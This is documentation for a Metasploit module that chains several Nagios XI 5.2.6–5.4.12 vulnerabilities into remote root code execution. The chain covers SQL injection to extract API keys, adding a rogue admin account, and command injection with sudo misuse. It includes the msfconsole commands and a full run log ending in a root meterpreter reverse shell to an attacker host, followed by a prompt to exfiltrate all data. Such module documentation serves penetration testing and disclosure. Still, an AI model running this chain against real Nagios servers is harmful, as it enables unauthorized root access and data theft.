## Vulnerable Application
	Nagios XI 5.2.6 - 5.4.12 Chained Remote Root RCE

	This exploit combines many different vulnerabilities in Nagios XI to 
  gain remote root access to the affected host. The process is:

  1. Reset the database user to root.
  2. Exploit SQL injection to extract api keys.
  3. Use api key to add administrative user.
  4. Authenticate to application using newly added user.
  5. Exploit command injection and sudo misconfiguration 
     to get remote root shell.
  6. Remove added admin user, and reset database user.
 
  See [our blog post](http://blog.redactedsec.net/exploits/2018/04/26/nagios.html) for more information

## Verification Steps

  1. ```use exploit/linux/http/nagios_xi_chained_rce_2_electric_boogaloo```
  2. ```set lhost [IP]```
  3. ```set rhost [IP]```
  4. ```exploit```
  5. A meterpreter session should have been opened successfully

## Scenarios

### Nagios 5.2.7 on CentOS 6.7

```
msf > use exploit/linux/http/nagios_xi_chained_rce_2_electric_boogaloo 
msf exploit(nagios_xi_chained_rce_2_electric_boogaloo) > set RHOST 69.4.20.6
RHOST => 69.4.20.6
msf exploit(nagios_xi_chained_rce_2_electric_boogaloo) > set LHOST 69.4.20.4
LHOST => 69.4.20.4
msf exploit(nagios_xi_chained_rce_2_electric_boogaloo) > exploit

[*] Started reverse TCP handler on 69.4.20.4:4444 
[*] STEP 0: Get Nagios XI version string.
[+] STEP 0: Found Nagios XI version: 5.4.10
[*] STEP 1: Setting Nagios XI DB user to root.
[*] STEP 1: Received a 302 Response. That's good!
[*] STEP 2: Exploiting SQLi to extract user API keys.
[*] STEP 2: Received a 302 Response. That's good!
[*] Found 1 unique api keys
[*] 40e54f81856f74bc7011022b745d6efd
[*] STEP 3: Using API Keys to add an administrative user...
[*] STEP 3: trying to add admin user with key 40e54f81856f74bc7011022b745d6efd
[+] Added user:pCdWMnnDdjFf password:SHtUJtiRLYTAZJ userid:3
[*] STEP 4.1: Authenticate as user pCdWMnnDdjFf with password SHtUJtiRLYTAZJ
[*] STEP 4.1: Get NSP and nagiosxi for login..
[*] STEP 4.1: login_nsp 1481a55bd9981a0eecfbf1bbedf79ad09fcb04822400c57813265c53dd2a7f1f 
[*] STEP 4.1: login_nagiosxi 57enou1blqbkma0flgmlm7bc07
[*] STEP 4.2: Authenticating...
[*] STEP 4.2: authed_nagiosxi q8lk1phgdu3md17u8ngm5431t2
[*] STEP 5.1: executing payload
[*] STEP 5.2: removing scripts from disc
[*] Command Stager progress - 100.00% done (701/701 bytes)
[*] STEP 6.1: Setting Nagios XI DB user to nagiosql.
[*] STEP 6.1: Received a 302 Response. That's good!
[*] STEP 6.2: deleting admin
[*] Sending stage (847604 bytes) to 69.4.20.6
[*] Meterpreter session 1 opened (69.4.20.4:4444 -> 69.4.20.6:58698) at 2018-04-30 21:56:47 -0400
[*] Be sure to run post/linux/gather/enum_nagios_xi to exfil all the data off this box!

meterpreter > getuid
Server username: uid=0, gid=0, euid=0, egid=0
meterpreter > 
```
